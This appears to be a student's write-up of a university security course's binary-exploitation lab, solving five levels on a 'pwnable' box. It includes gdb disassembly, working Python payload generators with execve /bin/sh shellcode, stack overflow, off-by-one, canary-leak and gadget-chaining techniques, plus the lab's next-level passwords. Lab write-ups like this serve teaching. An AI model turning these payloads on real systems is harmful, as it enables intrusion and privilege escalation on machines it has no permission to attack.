## 1

The makefile is interesting and I think the professor tried his best to
make the program unsafe.
Just run gdb and see what happens:

```
invoke -d dejavu
break deja_vu
run
x/24i $pc
#- ---------------
=> 0xb7ffc4ab <deja_vu+6>:	sub    $0xc,%esp
   0xb7ffc4ae <deja_vu+9>:	lea    -0x10(%ebp),%eax
   0xb7ffc4b1 <deja_vu+12>:	push   %eax
   0xb7ffc4b2 <deja_vu+13>:	call   0xb7ffc75e <gets>
   0xb7ffc4b7 <deja_vu+18>:	add    $0x10,%esp
   0xb7ffc4ba <deja_vu+21>:	nop
   0xb7ffc4bb <deja_vu+22>:	leave  
   0xb7ffc4bc <deja_vu+23>:	ret    
   0xb7ffc4bd <main>:	lea    0x4(%esp),%ecx
   0xb7ffc4c1 <main+4>:	and    $0xfffffff0,%esp
   0xb7ffc4c4 <main+7>:	pushl  -0x4(%ecx)
   0xb7ffc4c7 <main+10>:	push   %ebp
   0xb7ffc4c8 <main+11>:	mov    %esp,%ebp
   0xb7ffc4ca <main+13>:	push   %ecx
   0xb7ffc4cb <main+14>:	sub    $0x4,%esp
   0xb7ffc4ce <main+17>:	call   0xb7ffc4a5 <deja_vu>
   0xb7ffc4d3 <main+22>:	mov    $0x0,%eax
   0xb7ffc4d8 <main+27>:	add    $0x4,%esp
   0xb7ffc4db <main+30>:	pop    %ecx
   0xb7ffc4dc <main+31>:	pop    %ebp
   0xb7ffc4dd <main+32>:	lea    -0x4(%ecx),%esp
   0xb7ffc4e0 <main+35>:	ret    
   0xb7ffc4e1 <dummy>:	ret    
   0xb7ffc4e2 <dummy1>:	ret    
```

Then we go to the call instruction.

```
break *0xb7ffc4b2
c
```

I saw that eax is 0xbffffab8. The return address should original be 0xb7ffc4d3 (in main), and I can easily find it at 0xbffffacc. So I should put payload at 0xbffffad0 and input `0123456789abcdef0123456789abcdef01234567 + bffffa40 + payload`, where paylaod is `6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a`. After fixing byte sequence problem with python, the input.txt is ready.

Now I can see 
```
pwnable:~$ ./exploit 
dumb-shell $ id
uid=1002(smith) gid=1001(vsftpd) groups=1001(vsftpd)
dumb-shell $ cat README
You have to let it all go. Fear, doubt, and disbelief. Free your mind.

Next username: smith
Next password: 37ZFBrAPm8
```

My code is attached below
```
#!/usr/bin/python3

def fuck8(txt):
    assert(len(txt) == 8)
    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]

def revert(txt):
    assert(len(txt) % 8 == 0)
    res = ""
    for i in range(int(len(txt) / 8)):
        res += fuck8(txt[i*8:(i+1)*8])
    return res


fill = "0123456789abcdef0123456789abcdef01234567"
#cs161-ace# raddr = "bffffa40"
#cs161-atw# raddr = "bffffad0"
raddr = "bffffad0"
#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
########################################################################################### <- append an endline (0x0a, \n)

payload = revert(fill) + revert(raddr) + (shellcode)
#print(payload)

import binascii

b = binascii.unhexlify(payload)
with open('/dev/fd/1','wb') as f:
    f.write(b)
```

## 2

Just do as what I did in problem 1. I can see the return address is 0x00400775, stored at &msg+128+20.
Because the buffer is large enough, I'll put payload here. &msg is 0xbffffa18, so I must change 0x00400775
to 0xbffffa18.

Oh I didn't tell you how should I bypass the `size` limit. Just put a `-1` and enjoy your day.

Now I can see

```
pwnable:~$ ./exploit 
j1X̀�É�jFX̀1�Ph//shh/binT[PS��1Ұ

�
/home/smith $ id
uid=1003(brown) gid=1002(smith) groups=1002(smith)
/home/smith $ cat README
Welcome to the real world.

Next username: brown
Next password: mXFLFR5C62
```

My code is attached below.
```
#!/usr/bin/python3

def fuck8(txt):
    assert(len(txt) == 8)
    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]

def revert(txt):
    assert(len(txt) % 8 == 0)
    res = ""
    for i in range(int(len(txt) / 8)):
        res += fuck8(txt[i*8:(i+1)*8])
    return res


raddr = "bffffa18"
#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"

length_to_fill = 20 + 128 - int(len(shellcode)/2)
fill = "01" * length_to_fill

int8_neg1 = "ff"

payload = int8_neg1 + (shellcode) + fill + revert(raddr)
#print(payload)

import binascii

b = binascii.unhexlify(payload)
with open('/dev/fd/1','wb') as f:
    f.write(b)
```

## 3

The question is off-by-one overflow problem. After reading aslr.pdf figure 30, I know that I should set %ebp to &buf[0] (0xbffffa40), and put the new return address in &buf[1], and put the payload. So I should overflow an "40" to %ebp. Now I'll do it.

However, after implementing the solution above, ./debug-exploit works but ./exploit doesn't. That's because overflowed "0x40" xor "1<<5" yields "`", which is beaking the shell (in the buggy exploit script). So I shift everything 4 bytes right. Now %ebp is set to &buf[1] and new return address is set to &buf[2] and overflowed byte is "44". Now everything is OK.

```
pwnable:~$ ./exploit
#Eg#EgL���j1X̀�É�jFX̀1�Ph//shh/binT[PS��1Ұ

D���9���'�������]���'��� ���4���
/home/brown $ cat README
Remember, all I'm offering is the truth. Nothing more.

Next username: jz
Next password: cqkeuevfIO
```

My `./arg` is still attached below. Note that my `./egg` is empty.

```
#!/usr/bin/python3

def fuck8(txt):
    assert(len(txt) == 8)
    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]

def revert(txt):
    assert(len(txt) % 8 == 0)
    res = ""
    for i in range(int(len(txt) / 8)):
        res += fuck8(txt[i*8:(i+1)*8])
    return res

## The FUCKING silly script booms the shell because overflow="40"="`".
## cs161-atw
#raddr = "bffffa48"
##shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
#shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
#
#overflow = "40" 
#buf0 = "01234567"
#
#length_to_fill = 64 - 8 - int(len(shellcode)/2)
#fill = "01" * length_to_fill
#
#payload = buf0 + revert(raddr) + (shellcode) + fill + overflow

## cs161-atw
raddr = "bffffa4c"
#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"

overflow = "44"
buf0 = "01234567"

length_to_fill = 64 - 8 - 4 - int(len(shellcode)/2)
fill = "01" * length_to_fill

payload = buf0 + buf0 + revert(raddr) + (shellcode) + fill + overflow


import binascii

b = binascii.unhexlify(payload)
b = bytes([byte^(1<<5) for byte in b])
with open('/dev/fd/1','wb') as f:
    f.write(b)

```

## 4

The solution is easy. Since BUFLEN=16, I send `0123456789ab\x`, then dehexify skips the `\0` and prints everything in canary area.

Now I construct a message with 16 junk characters to fill the buffer, correct canary, another 8 characters to shift ebp & other staffes, and the return address, then the shellcode.


## 5

- motivation

I noticed the following content in `objdump -d agent-jones`:

```
 8048680:	89 c8                	mov    %ecx,%eax
 8048682:	89 45 0c             	mov    %eax,0xc(%ebp)
 8048685:	8b 45 08             	mov    0x8(%ebp),%eax
 8048688:	23 45 0c             	and    0xc(%ebp),%eax
 804868b:	5d                   	pop    %ebp
 804868c:	c3                   	ret    

...

08048930 <__do_global_ctors_aux>:
 8048930:	55                   	push   %ebp
 8048931:	89 e5                	mov    %esp,%ebp
 8048933:	53                   	push   %ebx
 8048934:	52                   	push   %edx
 8048935:	bb dc 9e 04 08       	mov    $0x8049edc,%ebx
 804893a:	8b 03                	mov    (%ebx),%eax
 804893c:	83 f8 ff             	cmp    $0xffffffff,%eax
 804893f:	74 07                	je     8048948 <__do_global_ctors_aux+0x18>
 8048941:	ff d0                	call   *%eax
 8048943:	83 eb 04             	sub    $0x4,%ebx
 8048946:	eb f2                	jmp    804893a <__do_global_ctors_aux+0xa>
 8048948:	58                   	pop    %eax
 8048949:	5b                   	pop    %ebx
 804894a:	5d                   	pop    %ebp
 804894b:	c3                   	ret    

```

I can set `%ebp` to any fixed address, then return to 0x08048680. Because `&buf` is in `%ecx`, then value of `0xc(%ebp)` will be `&&buf`. Then put `%ebp+0xc` (that's a fixed address) onto stack, return to `0x08048949`, and now we have `&&buf` in `%ebx`. Then return to `0x0804893a`, `(%ebx)` is sent to `%eax` and jumps to `&buf`, we win!

However, we need a fixed-address writable page to put `%ebp`. The page `0x08048000 - 0x08049000` is not writable. I'm so lucky that the page starts at `0x0804a000` works! So I set the "fixed address" to `0x0804a790`.

- implementation

Please see the image below. The procedure is too complicated to explain.

![Please contact root@recolic.net if you can not view this image](https://dl.recolic.net/res/161-proj1-5.png)

Because I have 40 bytes ahead for payload, I can put a shellcode to launch /bin/sh directly. But if I want to create tcp server, I have to write a simple payload and jmp to `&buf+68`. The simple payload is attached below.

```
// get current addr
call foo
foo:
pop %eax

// 40 + 4+4+4+4+4+4+4 - 5
add $63, %eax
jmp *%eax
```

I put 5 `nop` at `&buf+68` to make it work even if I have made a mistake.



